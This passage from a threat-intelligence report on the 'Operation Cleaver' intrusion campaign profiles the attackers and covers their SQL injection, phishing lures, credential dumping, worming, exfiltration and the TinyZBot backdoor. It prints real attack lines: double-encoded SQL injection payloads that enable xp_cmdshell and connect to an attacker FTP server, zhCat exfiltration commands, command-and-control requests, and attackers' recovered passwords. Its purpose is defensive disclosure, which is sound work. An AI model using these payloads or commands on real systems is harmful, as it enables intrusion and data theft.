observed using\nVisual Studio 2010, and his tools are written exclusively for Windows. Some of his tools were found\nto be packed with ASPack.\n\n\nParviz is the primary developer of the PVZ bot and multiple parts of its tool chain. Parviz is likely\nassociated with the PVZ bot as his name in hardcoded into the PDB file paths.\n\nThe PVZ tool chain includes a variety of functionality, such as HTTP command and control\ncommunications with an ASPX server-side component, a denial of service tool they developed, and\nthe public project named XYNTService used to run ordinary applications as services.\n\n\n###### PDBs\n```\n• C:\\Users\\parviz\\documents\\visual studio 2010\\Projects\\BotManager\\\nRelease\\BotManager.pdb\n\n```\n- C:\\Users\\parviz\\Documents\\Visual Studio 2010\\Projects\\socket-test\\\n```\nRelease\\socket-test.pdb\n\n```\n- C:\\Users\\parviz\\Documents\\Visual Studio 2010\\Projects\\\nXYNTServiceProject\\XYNTServiceProject\\Debug\\XYNTService.pdb\n```\n• C:\\Users\\Parviz\\documents\\visual studio 2010\\Projects\\SendModule\\\nRelease\\SendModule.pdb\n\n```\n\n-----\n\n###### #OPCLEAVER\n\n\n###### Nesha\n\nNesha is one of the offensive members of this organization. Nesha was seen in breaches involving\nSQL injection as well as other techniques. Nesha often utilized web-based backdoors developed\nin ASPX, PHP as well as ColdFusion. A copy of an MS08-067 exploit developed in Python was\nrecovered in which Nesha shamelessly replaced the original author’s name with his own.\n\n\nNesha’s passwords very commonly include own handle. His passwords were frequently stored\nas hashes in backdoors, but common hash cracking methods were able to recover the plaintext\nversions. His observed password use is as follows:\n\n-  nesha nesha used as password in ColdFusion backdoors\n\n-  NeshaNesha12 used as password in ASPX backdoors.\n\n-  nesha123 was found as a password in a recovered credential file with unknown association\n\n###### 7\n\n\nCylance observed Nesha participating in compromises involving the following techniques:\n\n-  SQL injection\n\n-  Web backdoors\n\n-  Cached credential dumping\n\n\nNesha has additionally been identified using a variety of internally developed tools as well as the\nfollowing publicly available tools:\n\n-  Cain & Abel\n\n-  PsExec\n\n-  PLink\n\n-  NetCat\n\n\n###### Alireza\n\nAlireza appears to be one of the senior developers of this organization. His tools are commonly\ndeveloped in C++, Java, and C# (desktop and ASPX). These tools are often support tools, either\nmonitoring the activity of other tools or supplementing the function of other tools gathering\ninformation during the infiltration process. Alireza’s code appears to be reused internally on\nprojects such as TinyZBot. Alireza appears to be using a version control system for his code, and\nit is likely that others are using the same system. Based on the paths, the version control system in\nuse is likely Apache’s Subversion. Use of a version control system is indicative of code sharing, but\nthe use of an older system like Subversion, along with other evidence, suggests there is not a large\namount of collaboration on projects and likely one developer working on each project at a time.\nThis is not behavior typical of a professional development team.\n\n\n-----\n\n##### CLEAVER\n\n\n###### Alireza (cont.)\n\nAlireza’s C# tools include the following techniques:\n\n\n\n-  Querying Windows Management Instrumentation Command-line (WMIC)\n\n-  Cached credential dumping\n\n-  Generating ASPX shells\n\n-  Encryption\n\n-  Process enumeration\n\nAlireza’s Java tools include the following techniques:\n\n\n\n-  HTTP communications\n\n-  GUI development\n\nAlireza’s C++ tools include the following techniques:\n\n\n\n-  WinPcap interface\n\n-  ARP poisoning\n\n-  HTTP communications\n\n-  SMB communications\n\n###### PDBs\n\n\n\n- C:\\Users\\alireza\\Documents\\Visual Studio 2010\\CPPProjects\\IDCSercive\\\n```\ntrunk\\Release\\kagent.pdb\n\n```\n- C:\\Users\\alireza\\Documents\\Visual Studio 2010\\CPPProjects\\\n```\nPcapServiceInstaller\\Release\\PcapServiceInstaller.pdb\n\n```\n- C:\\Users\\alireza\\Documents\\Visual Studio 2010\\Projects\\\nAntiVirusDetectorConsole\\AntiVirusDetectorConsole\\obj\\x86\\Release\\\nAntiVirusDetectorConsole.pdb\n\n- C:\\Users\\alireza\\Documents\\Visual Studio 2010\\Projects\\\nmimikatzWrapper\\mimikatzWrapper\\obj\\x86\\Debug\\mimikatzWrapper.pdb\n\n- C:\\Users\\alireza\\Documents\\Visual Studio 2010\\Projects\\ShellCreator2\\\nShellCreator2\\obj\\x86\\Debug\\ShellCreator2.pdb\n\n- c:\\Users\\alireza\\Documents\\Visual Studio 2012\\Projects\\BackDoorLogger\\\nBackDoorLogger\\obj\\Debug\\BackDoorLogger.pdb\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### kaJ\n\nkaJ is a .NET developer, and has only been observed working in C#. He has less English language\nproficiency than others in the organization, and likely has a supplemental role during compromises.\nHe has been observed developing tools which cater to specific challenges in a compromise. His\nnotable project was named Net Crawler, and a technical analysis of this tool can be found in the\n**Tactics, Techniques and Procedures section. Thanks to a recovered test configuration for Net**\nCrawler, we were able to determine that kaJ’s development computer has the name dev-castle,\nwhere he has the username kaJ and the password oaolrJ@vad. kaJ is believed to be the creator\nof the Zhoupin ASCII art displayed in Net Crawler.\n\n\nkaJ’s projects include the following techniques.\n\n-  Interfacing with multiple cached credential dumping tools7\n\n-  Interfacing with PsExec\n\n-  Worming behavior\n\n\n###### Jimbp\n\nJimbp is a .NET developer with minimal experience. His projects appear to be supplemental to\nTinyZBot and are very simplistic. It is believed he is the developer of the project Binder_1. This\nproject was a simple malware binder which required manual configuration when compiling. His\nother work included creating a new service wrapper for TinyZBot.\n\n\n###### PDBs\n\n- c:\\Users\\Jimbp\\Desktop\\Binder_1\\Binder_1\\obj\\x86\\Release\\Setup.pdb\n\n- c:\\Users\\Jimbp\\Desktop\\Binder_1 - for cleaver\\Binder_1\\obj\\x86\\\n```\nRelease\\Setup.pdb\n\n```\n- c:\\Users\\Jimbp\\Documents\\Visual Studio 2013\\Projects\\\nTestForInstallingService\\TestForInstallingService\\obj\\Release\\\nTestForInstallingService.pdb\n\n\n-----\n\n##### CLEAVER\n\n\n###### TEAMS\n\nOf course many associated Iranian hacker teams have been identified in public and private\nsecurity circles. Some of the teams publicly known today include Iranian Cyber Army, Ashiyane,\nIslamic Cyber Resistance Group, Izz ad-Din al-Qassam Cyber Fighters, Parastoo, Shabgard, Iran\nBlack Hats and many others[9].\n\n\nHowever, even though the TTPs of the Cleaver team have some overlap to techniques used by\nIranian Cyber Army (botnets), Ashiyane (SQL injection) and Syrian Electronic Army (phishing and\nRATs), we believe this is largely the work of a new team. Some connections to Ashiyane were\ndiscovered in our investigations including a reference to hussein1363, who had prior ties to\nthe hacker group. Additional connections between team members and individuals exist but are\npredominantly speculative and have only been shared with law enforcement.\n\nUltimately we believe the Cleaver team is a mix of existing team members and new recruits\npulled from the universities in Iran.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n### TACTICS, TECHNIQUES\n\n##### TTP COVER HERE\n\n## & PROCEDURES\n\n###### 7\n\n\n-----\n\n##### CLEAVER\n\n\n###### TACTICS, TECHNIQUES & PROCEDURES\n\nThe Cleaver campaign used a variety of methods in multiple stages of attacks. In this section we’ll\ncover the commonly observed methods during different stages of the attack.\n\n\n###### INITIAL COMPROMISE\n\nThe initial compromise gets the attackers their first foothold into the target network. Once the\nability to execute arbitrary code has been established, an attacker’s job becomes quite a bit\neasier. Since the vector of initial compromise is usually determined by what is vulnerable on the\ntarget, we’ll cover just a few of the techniques we’ve seen Operation Cleaver use to initiate the\ncompromise.\n\n\n###### SQL Injection\n\nSQL injection is a very common and simple attack method. It is made possible by a lack of input\nsanitization by the vulnerable application before supplying that input into a SQL database query.\nSQL injection payloads used by this organization have been double encoded. Double encoding\nSQL injection payloads allows for bypassing of various anti-exploitation filters, such as those\nsupplied by Web Application Firewalls (WAFs).\n\n\nThe attackers would enable xp_cmdshell:\n\nhttp://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@\nb1=%20show advanced options;declare%20@b2%20varchar(8000);set%20@b2=%20xp_\ncmdshell;%20EXEC%20master.dbo.sp_configure%20@b1,%201;RECONFIGURE;EXEC%20master.dbo.\nsp_configure%20@b2,%201;RECONFIGURE;--%20\n\nThen connect outbound via anonymous FTP:\n\nhttp://localhost/Demos/demo.cfm?Edit%26ID=111;declare%20@b1%20varchar(8000);set%20@\nb1=%20ftp -A 108.175.152.230;%20exec%20master..xp_cmdshell%20@b1--%20\n\n###### Spear-Phishing Campaign\n\n\nUsing messaging methods such as email, attackers can social engineer users into downloading\nand executing software, which quietly installs malware alongside of the desired program.\nOperation Cleaver has employed this technique numerous times across different organizations.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### EasyResumeCreatorPro.com\n\nThe domain EasyResumeCreatorPro.com was registered and a website setup which was a direct\ncopy of a legitimate website at winresume.com. This is how the original site looked:\n\n###### 7\n\n**Figure 14: The original Easy Résumé Creator Pro website on winresume.com is legitimate.**\n\n**Figure 15: The fraudulent website, easyresumecreatorpro.com, is a fraudulent copy of the Easy**\nResume Creator Pro website to lure job candidates to download and install their TinyZBot agent.\n\nThat’s not all they copied. In order to infect users, they combined the original Easy Resume Creator\nPro product with malware by using a binder they developed internally named Binder_1. A binder\nis an application, which combines two executables (desired software and malware) into a single\nexecutable.\n\nThe resulting executable masquerades as the desired software. The purpose is deception, to make\nthe binder indistinguishable from the desired application. When executed, both applications are\nwritten to a temporary directory and executed. This way it appears that the desired application was\nexecuted, but the malware was also executed silently.\n\n\n-----\n\n##### CLEAVER\n\n\n###### Teledyne Résumé Submitter\n\n**Figure 16: When the résumé submitting**\napplication is executed, a splash screen is\ndisplayed.\n\n\nThis attack evolved to appear more legitimate. The\nattackers made the victims feel like they had a pending\njob opportunity at the industrial conglomerate Teledyne. In\norder to take advantage of this job opportunity, the victim\nneeded to use the fake résumé submission application\nsupplied by the malicious recruiter. Multiple domains were\nregistered in order to make the download sites seem more\nrealistic. These domains included other companies as they\ntried to hit a wider audience.\n```\n   • Teledyne-Jobs.com\n\n```\n   - Doosan-Job.com\n```\n   • NorthropGrumman.net\n\n```\n\n**Figure 17: Unable to connect to the Internet, the**\ntool prompts the user for proxy configuration\ninformation.\n\n**Figure 18: Final résumé submission form**\ndisplays to the user while the malware runs\nfreely in the background.\n\n\nAt this point, the résumé submission application checks the\nInternet connection. If it is unable to connect to the Internet,\nit will display a window to input proxy information.\n\nWhen this information is entered, the results are cached\nin a location the dropped malware can access. After an\nInternet connection is ensured, the malware (TinyZbot) is\ndropped and executed. This clever scheme makes sure the\nmalware can connect to the command and control server,\nand increases the chances that domain credentials are\ncached on the now infected machine. Shortly after, the main\napplication is launched.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### Teledyne Résumé Submitter (cont.)\n\nThe first résumé submission form requests contact information. This form, like the rest of the\nsubmission forms, only stores the submitted information while the application is running. As the\ninfected user is going through and filling out all this information, the malware is running in the\nbackground, logging their keystrokes, retrieving their stored passwords, etc. Once all the forms are\nfilled out, the user goes to the submission form.\n\n###### 7\n\n**Figure 19: GET request to www.microsoft.com fakes the résumé submission.**\n\nWhen the victim hits submit, the résumé submitter does a GET request to microsoft.com in order\nto make it seem like it is submitting something, then claims success.\n\nThis method is particularly effective not only because of its level of deception, but even if the victim\nsuspects that they are infected with malware, they are not as likely to speak up about it, as they\nwould need to explain why they were submitting a job application for another company.\n\n\n###### 7\n\n\n-----\n\n##### CLEAVER\n\n\n###### PRIVILEGE ESCALATION & PIVOTING\n\nPrivilege escalation is a category of techniques that describe the process of going from a less\nprivileged user on a compromised computer to a more privileged user. This increase in privileges\nallows for the attacker to gain access to privleged areas of the operating system as well as to\ninfect other computers on the target network.\n\n\nThis team did not utilize any novel methods of privilege escalation, but they were observed\nusing a variety of publicly known exploits. PrivEsc is a compiled exploit, which leverages\nthe vulnerability commonly referred to as KiTrap0D (CVE-2010-0232). The exploit allows for\nescalation of privileges on unpatched Windows operating systems from an unprivileged user to\nkernel-level privilege.\n\nThis vulnerability and the corresponding exploit were discovered and developed in 2010.\nThe plagiarized version used in Operation Cleaver was compiled in May 2013, with a slight\nmodification to the public source code. This modification changed the author’s details to Zhopin\n```\nExploit Team.\n\n```\n\nPivoting is the process of leveraging access from one compromised computer in order to gain\naccess to additional systems on the target network. This can involve launching attacks from the\ncompromised computer, or simply abusing access once it has been gained.\n\n###### Cached Credential Dumping\n\n\nA very common method of pivoting on a predominantly Windows operating system based\nnetwork is to extract domain credentials which have been used on the compromised computer\nfrom a credential cache. There are a few well-known tools which are capable of doing this given\nsufficient privileges on the infected host. Two of these tools used by Cleaver are Mimikatz and\nWindows Credential Editor.\n\n###### zhMimikatz and MimikatzWrapper\n\n\nTwo similar applications were developed by Operation Cleaver in order automate the execution\nof Mimikatz. These applications are zhMimikatz and MimikatzWrapper. These applications store\nmultiple versions of Mimikatz in their resources. When executed, they determine which version\nof Mimikatz to use based on whether the computer’s version of Windows is 32-bit or 64-bit. This\ntechnique is uncommon in malware and shows the advanced skillset of the Cleaver team. Both\ntools were developed in C#.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### zhMimikatz and MimikatzWrapper (cont.)\n\nIn the following examples, the computer name is TheComputerName, the username of the\nlogged in user is TheUser, and that user’s password is ThePassword. At the time of execution,\nthe system only has its own credentials available and no cached network credentials.\n\n\n###### zhMimikatz\n\nzhMimikatz executes the correct version of Mimikatz for the current system, and parses the results\nfor any cached credentials.\n\n###### 7\n\n\n###### 7\n\n\n-----\n\n##### CLEAVER\n\n\n###### MimikatzWrapper\n\nOutput from MimikatzWrapper is essentially the same as zhMimikatz, despite being a different\nVisual Studio project.\n\n\n**Figure 21: The MimikatzWrapper.**\n\nThe only external difference is that MimikatzWrapper also logs these results to res.txt in the\nexecuting directory. This can make it useful for tools like the PVZ tool chain and Csext to execute\nwith logged results:\n\n\n**Figure 22: The MimikatzWrapper dumps credentials out to a file.**\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### PsExec Spreading\n\nOnce an attacker has credentials extracted from the cache, whether in hash form or in plaintext\nform, PsExec can be used to run commands on any other computer which accepts those domain\ncredentials. If this technique is combined with cached credential dumping, it can be used to jump\nfrom computer to computer on a compromised network.\n\n\n###### NetC (Net Crawler)\n\nNet Crawler utilizes a cached credential dumping technique along with PsExec in order to\nworm throughout a network, collecting any and all credentials that it can extract from credential\ncaches. It has the ability to do this with both Windows Credential Editor and Mimikatz. It starts by\nfirst extracting cached credentials from the infected computer’s cache. Once this is complete, it\nthen continues to scan a set of configured IP addresses on the local subnet to determine which 7\nIP addresses have SMB related ports open. Then an iterative methodology is applied to brute\nforcing each SMB enabled target with each credential that was extracted from the cache.\n\n\nthen continues to scan a set of configured IP addresses on the local subnet to determine which\n\n\nWhen a positive result has been achieved, it will create a copy of itself with a modified\nconfiguration stored as a PE resource, then send and execute the copy utilizing PsExec. This\ncopy repeats the behavior of the original, but with already discovered credentials as well as\nnewly discovered ones on the newly infected host. Any credentials found are reported back to\nthe original infection.\n\n\n-----\n\n##### CLEAVER\n\n\n###### NetC (Net Crawler) cont.\n\nThe following is a sample of some of the recovered results of Net Crawler executing on a live\nnetwork:\n\n\n**Figure 23: The real output of a successfully run NetC effort at a victim organization.**\n\nA more in depth analysis of Net Crawler, as part of the A Study in Bots series, will be available on\nCylance’s blog.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### MS08-067 Exploit\n\nMS08-067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can\nbe exploited by a specially crafted packet to the operating system’s RPC network interface. This\nvulnerability has been patched since October 2008, but many networks have failed to update their\nsystems even to this day.\n\n\nOperation Cleaver used a plagiarized version of a publicly available exploit for this vulnerability\ndeveloped in Python. Someone in the Cleaver team (presumed to be Nesha) modified the exploit to\nread “By Nesha”.\n\n###### Jasus\n\n\nJasus is an ARP cache poisoner developed by the Operation Cleaver team. It makes use of 7\nWinPcap and is developed in C. Compared to some other publicly available ARP cache poisoning\nutilities, Jasus is poorly developed and without many useful features. The primary positive attribute\nof Jasus is its poor detection ratio by the antivirus industry.\n\n###### Cain & Abel\n\n\nCain & Abel is a publicly available toolkit, which covers a wide range of functionality that assists\nattackers once they have compromised a node on a network. It has the ability to dump stored and\ncached credentials, and conduct attacks like ARP cache poisoning in order to capture credentials\nbeing transmitted on the network. It also has a remotely installable trojan named Abel, which\nenables some of its functionality on a remote target.\n\nWe observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches\nand the network when they are confident that there is little to no antivirus protection on the infected\ntarget.\n\n\n###### EXFILTRATION\n\nExfiltration is the process of moving information to an external site. In this context, it is the process\nof stealing information without being detected. Operation Cleaver has a strong focus on stealing\nconfidential/privileged information, and they have utilized a few methods in order to facilitate this\nobjective.\n\n\n-----\n\n##### CLEAVER\n\n\n###### Anonymous FTP Servers\n\nCleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access\nenabled in order to pilfer large quantities of information. This allowed them to use existing\ncommand line utilities available on their targets in order to upload information. This is a versatile\ntechnique as it does not require any additional software which could be detected. These\nFTP servers were also observed during the infection process, as infected computers were\noften instructed to download additional files from these FTP servers, including backdoors and\npivoting tools.\n\n\nThe following IP addresses hosted FTP servers that were used in the infection of targets or in\nthe exfiltration of information.\n```\n• 108.175.152.230 – Santa Rosa, CA, USA\n• 108.175.153.158 – Santa Rosa, CA, USA\n• 184.82.181.48 – Pilot Mountain, North Carolina, USA\n• 203.150.224.249 - Thailand\n• 64.120.208.74 - Pilot Mountain, North Carolina, USA\n• 64.120.208.75 - Pilot Mountain, North Carolina, USA\n• 64.120.208.76 - Pilot Mountain, North Carolina, USA\n• 64.120.208.78 - Pilot Mountain, North Carolina, USA\n• 66.96.252.198 - Pilot Mountain, North Carolina, USA\n\n```\n\n###### NetCat\n\nNetCat is a network tool which has many valid purposes but can also be used for malicious\npurposes. Its main functionality allows for a client and server communication channel, allowing\nfor information to be transported over the network simply. NetCat has an option when being\ncompiled to enable or disable the ability for NetCat to execute a command after the connection\nis established. This feature can be abused to enable a reverse connecting shell, which can be\nused to remotely control a target.\n\n\nNetCat’s network communications are in plaintext, and could be viewed by an egress filter\nlooking to block the exfiltration of sensitive information. The Operation Cleaver team was\nobserved attempting to use NetCat to exfiltrate information as well as use it as a reverse\nconnecting shell. The use of NetCat was later replaced with zhCat.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### zhCat\n\nzhCat is a tool developed by the Operation Cleaver team which operates similarly to NetCat. Its\nmain purpose is to create a channel that is capable of transporting information over the network.\nThe changes made in zhCat allow for this information to be transferred with inline obfuscation and/\nor encryption. This makes it more difficult to detect that privileged information is being exfiltrated.\n\nThe command line help (of a particular version) shows the following options:\n\n###### 7\n\nMultiple obfuscation/encryption methods are available. The –h argument enables HTTP mode.\nThis makes the traffic between zhCat instances look like benign HTTP traffic. For instance, if the\nattackers set up a zhCat instance listening on port 1000 on 192.168.116.128 in HTTP mode, the\nclient instance of zhCat would use the following command:\n\n\n###### 7\n\n\n-----\n\n##### CLEAVER\n\n\n###### zhCat (cont.)\n\nIf we observe the network communications during this transfer, we can see the following HTTP\nPOST request.\n\n\nNote: research into ebizmba.com did not turn up any additional evidence of being involved\nwith the development of zhCat.\n\nOn the server side, we can see our message has been received:\n\n\nIf stricter egress filtering is enabled, the attackers can use zhCat to also XOR encrypt the traffic\nwith a shared key. These keys are stored inside zhCat. The following is the key used for XOR\nencryption:\n\nSorry! The handle to file %s is not a valid handle any more.\\nSorry!\nThe handle to file %s is not a valid handle any more.\n\n\nThe \\n represents hex character 0x0A, which is a new line character.\n\nAn attacker could set up a server instance of zhCat with the following command in order to\nenable both HTTP and XOR obfuscation:\n\n```\n             zhcat.exe –h –p 1000 –l –x\n\n```\nThe client instance could then be invoked with the following command:\n\n```\n        zhcat.exe –h –p 1000 –i 192.168.116.128 –x\n\n```\nOnce again, information can be supplied via standard input.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### zhCat (cont.)\n\nUpon inspecting the network traffic again, we see the following HTTP POST request.\n\n###### 7\n\nOn the server side, we can see this information being received:\n\nzhCat has a variety of other features such as port mirroring as well as traffic redirecting.\n\n###### PLink\n\nPLink is one of the many utilities provided in the PuTTY (SSH) suite, which has many benign\npurposes. It is capable of communicating over various protocols, the most notable being SSH.\nThe SSH protocol is a heavily utilized encrypted protocol, most commonly used for remote\nadministration of UNIX based operating systems. PLink is designed to implement some of the\nSSH functions related to forwarding traffic as well as other functionality.\n\nOperation Cleaver uses PLink to forward local RDP ports to remote SSH servers. This allows them\nto easily connect to RDP servers inside the networks of their victims. These RDP connections can\nbe used to exfiltrate information visually, as well as to remotely control the computers hosting the\nRDP servers.\n\n\n###### 7\n\n\n-----\n\n##### CLEAVER\n\n\n###### SMTP\n\nEarly Cleaver operations abused SMTP in order to exfiltrate information. The sending is\nperformed by internally developed malware samples such as TinyZBot and Csext in order to\nexfiltrate information about the infected computer, as well as requested files and keystroke\nlogging information. Messages were sent using an open SMTP relay at BeyondSys.com with\nthe sender email address dyanachear(at)beyondsys.com. This allowed the attackers to use\ninfrastructure that was not theirs to exfiltrate information. The known recipient addresses of this\ninformation were testmail_00001(at)yahoo.com and TerafficAnalyzer(at)yahoo.\n```\ncom. In order to deceive anyone reading these emails, they made them appear to be a spam\n\n```\nmessage that most would not think twice about. The subject used is the following:\n\n\nNo Prescription required. Viagra Dosages: 25, 100, 150mg.\nFast worldwide delivery.\n\n\nThe message used is the following:\n\nBuy Viagra150mg x 50 tablets for only $124.99!\n\n\nNo Prescription required. Viagra dosages: 150, 100, 25mg. Fast\nWorldwide Delivery.\n```\nSee the attachment movie.\n\n```\n\nFree bonus trip.\n\n```\n   bestviagra4u.cn\n\n```\nThe files being exfiltrated are added to the email as attachments.\n\n\n###### SOAP\n\nSOAP is a sub-protocol communicated via HTTP. In relation to Operation Cleaver, it is used as the\ncommand and control protocol for TinyZBot, which was the preferred backdoor, and underwent\nlong-term development. HTTP communications are often used by botnets, but it is uncommon\nto use a sub-protocol such as SOAP. It is likely that SOAP was used because it is simple to\nimplement in C#, and has the added benefit of blending in with other benign HTTP traffic.\n\n\nAs part of TinyZBot’s command and control protocol, files can be exfiltrated over SOAP to the\ncommand and control server. For more information about TinyZBot, see the Persistence section.\n\n\n-----\n\n###### #OPCLEAVER\n\n\n###### PERSISTENCE\n\nPersistence is the means of maintaining access to a compromised network. There are limitless\nmethods of persistence; the following are techniques and tools for persistence used by Cleaver.\n\n\n###### TinyZBot\n\nTinyZBot is a backdoor developed in C#. This bot is the longest developed malware we have\nanalyzed from this organization. The earliest known version was compiled in January 2013 and\nwe continued to see new versions being created actively. The purpose of TinyZBot is to gather\ninformation from an infected computer as well as maintain and further access into a compromised\nnetwork.\n\n\nTinyZBot was developed with the clear intention of targeted campaigns. The name TinyZBot is 7\nassumed to be referring to this project as a less versatile version of the ZeuS botnet, although\nit does not exhibit the major browser injection features of ZeuS. To be clear, TinyZBot shares\nno code with ZeuS or its variants, and is developed in a different programming language. The\nmajority of the code in TinyZBot was created by Cleaver.\n\n###### TinyZBot Features\n\n\nTinyZBot was developed with the clear intention of targeted campaigns. The name TinyZBot is\n\n\nTinyZBot supports a wide array of features that continually evolved over time. For the evolution of\nfeatures, see the History section. The following is a list of supported features:\n\n-  SMTP exfiltration\n\n-  Log keystrokes\n\n-  Monitor clipboard activity\n\n-  Enable a SOAP-based command and control channel\n\n-  Self-updating\n\n-  Download and execute arbitrary code\n\n-  Capture screenshots\n\n-  Extract saved passwords for Internet Explorer\n\n-  Install as a service\n\n-  Establish persistence by shortcut in startup folder\n\n-  Provide unique malware campaign identifiers for tracking and control purposes\n\n-  Deceptive execution methods\n\n-  Dynamic backdoor configuration\n\n-  FTP exfiltration\n\n-  Security software detection\n\n-  Ability to disable Avira antivirus\n\n-  Ability to modify PE resources\n\n-  Dynamic plugin structure\n\n\n-----\n\n##### CLEAVER\n\n\n###### TinyZBot Command and Control Protocol\n\nThe command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP.\nPotential reasons for using SOAP are:\n\n\n1. SOAP-based communications are simple to implement in C#.\n2. SOAP traffic could easily be considered benign traffic, as it is not commonly seen in malware.\n\nAs part of SOAP communications, a URI is specified. This is internal to the sub-protocol, and does\nnot necessarily reflect the URI of the host running the SOAP server (ASMX file). In the case of\nTinyZBot, and many examples for developing SOAP applications, this URI is tempuri.org.\n\n\nSince the first version of the SOAP-based command and control protocol was implemented,\nTinyZBot used what is referred to as a “dynamic password”. The result of this is a\ncryptographically hashed version of the server time (which must be obtained through a SOAP\nquery), the TinyZBot’s GUID, and the TinyZBot’s AppUsageID (campaign identifier).\n\nFor the command and control examples below, red text represents TCP data sent from the\nTinyZBot infection while blue text represents TCP data sent from the command and control\nserver. The server time lookup query invokes the SOAP command GetServerTime.\n\n```\nPOST /checkupdate.asmx HTTP/1.1\n\n```\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433)\nContent-Type: text/xml; charset=utf-8\n```\nSOAPAction: “http://tempuri(dot)org/GetServerTime”\nHost: microsoftactiveservices(dot)com\nContent-Length: 291\nExpect: 100-continue\nConnection: Keep-Alive\nHTTP/1.1 100 Continue\n\n```\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope\nxmlns:soap=”http://schemas.xmlsoap.org/soap/envelope/” xmlns:xsi=”http://www.w3.org/2001/\n```\nXMLSchema-instance”\n\n```\nxmlns:xsd=”http://www.w3.org/2001/XMLSchema”><soap:Body><GetServerTime xmlns=”http://tempuri.\norg/” /></soap:Body></soap:Envelope>\n\n```\nHTTP/1.1 200 OK\n\n```\nCache-Control: private, max-age=0\nContent-Type: text/xml; charset=utf-8\n```\nServer: Microsoft-IIS/7.5\n\n```\nX-AspNet-Version: 2.0.50727\n```\nX-Powered-By: ASP.NET\n\n```\nDate: Mon, 06 Oct 2014 13:36:47 GMT\n```\nContent-Length: 392 \n\n```\n\n-----\n\n###### #OPCLEAVER\n\n\n###### TinyZBot Command and Control Protocol (cont.)\n\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope\nxmlns:soap=”http://schemas.xmlsoap.org/soap/envelope/” xmlns:xsi=”http://www.w3.org/2001/\n```\nXMLSchema-instance”\n\n```\nxmlns:xsd=”http://www.w3.org/2001 XMLSchema”><soap:Body><GetServerTimeResponse xmlns=”http://\ntempuri.org/”><GetServerTimeResult>2014-10-06T13:36:47.2193601Z</GetServerTimeResult></\nGetServerTimeResponse></soap:Body></soap:Envelope>\n\n\nThis is the first query done by a running TinyZBot instance, and needs to be done shortly before\nmost other queries, in order to update the dynamic password.\n\nCommands, updates and files to drop and execute are stored as files on the SOAP server, and\naccess is restricted by the AppUsageID as well as the bot GUID. This allows for commands to be\nsent to all bots for a campaign as well as individual control. The TinyZBot queries the server in\n\n###### 7\n\norder to enumerate all files currently available to it.\n\n```\nPOST /checkupdate.asmx HTTP/1.1\n\n```\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433)\nContent-Type: text/xml; charset=utf-8\nSOAPAction: “http://tempuri(dot)org/GetFileList”\n```\nHost: microsoftactiveservices(dot)com\nContent-Length: 425\nExpect: 100-continue\nHTTP/1.1 100 Continue\n\n```\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope xmlns:soap=”http://schemas.xmlsoap.org/\n```\nsoap/envelope/”\n\n```\nxmlns:xsi=”http://www.w3.org/2001/XMLSchema-instance” xmlns:xsd=”http://www.w3.org/2001/\nXMLSchema”><soap:Body><GetFileList xmlns=”http://tempuri(dot)org/”><Id>00cf6217-8c7e-4598b155-65ebd949bba9</Id><AppType>XYZCO</AppType><IP /><Pass>abefc81</Pass><Version>BDFF;1.0.0</\nVersion></GetFileList></soap:Body></soap:Envelope>\n\n\nHTTP/1.1 200 OK Cache-Control: private, max-age=0\nContent-Type: text/xml; charset=utf-8\nServer: Microsoft-IIS/7.5 X-AspNet-Version: 2.0.50727\nX-Powered-By: ASP.NET Date: Mon, 06 Oct 2014 13:36:47 GMT\n```\nContent-Length: 1474\n\n```\n<?xml version=”1.0” encoding=”utf-8”?><soap:Envelope xmlns:soap=”http://schemas.xmlsoap.org/\n```\nsoap/envelope/”\n\n```\nxmlns:xsi=”http://www.w3.org/2001/XMLSchema-instance”\nxmlns:xsd=”http://www.w3.org/2001/XMLSchema”><soap:Body><GetFileListResponse xmlns=”http://\ntempuri.org/”>\n\n\n-----\n\n##### CLEAVER\n\n\n###### TinyZBot Command and Control Protocol (cont.)\n\n<GetFileListResult><string>[ALL]__b93c-49a1-140914084450__[0000000000000000000000000000\n0000].tmu</string><string>[ALL]__b93c-49a1-140914084612__[0000000000000000000000000000\n0000].tmu</string><string>[ALL]__b93c-49a1-140914084619__[00000000000000000000000000000\n000].tmu</string><string>[ALL]__b93c-49a1-140914084628__[00000000000000000000000000000\n000].tmu</string><string>[ALL]__b93c-49a1-140914084638__[00000000000000000000000000000\n000].tmu</string><string>[ALL]__b93c-49a1-140914084644__[00000000000000000000000000000\n000].tmu</string><string>[ALL]__b93c-49a1-140914084659__[000000000000000000000000000000\n00].tmu</string><string>[ALL]__b93c-49a1-140914084715__[0000000000000000000000000000000\n0].tmu</string><string>[ALL]__b93c-49a1-140914084732__[00000000000000000000000000000000\n].tmu</string><string>[ALL]__b93c-49a1-140914084741__[00000000000000000000000000000000].\ntmu</string><string>[ALL]__b93c-49a1-140914090807__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103605__[00000000000000000000000000000000].tmu</\nstring><string>[ALL]__b93c-49a1-140915103610__[00000000000000000000000000000000].tmu</string></\nGetFileListResult></GetFileListResponse></soap:Body></soap:Envelope>\n\n\nIn order to download the file and parse for commands to execute, the TinyZBot must request the\nfile. The file is downloaded Base64-encoded inside of the SOAP response.\n```\nPOST /checkupdate.asmx\n\n```\nHTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol\n```\n2.0.50727.1433)\n\n```\nContent-Type: text/xml; charset=utf-8\nSOAPAction: “http://tempuri(dot)org/GetFile”\n```\n Host: microsoftactiveservices(dot)com\nContent-Length: 478\nExpect: 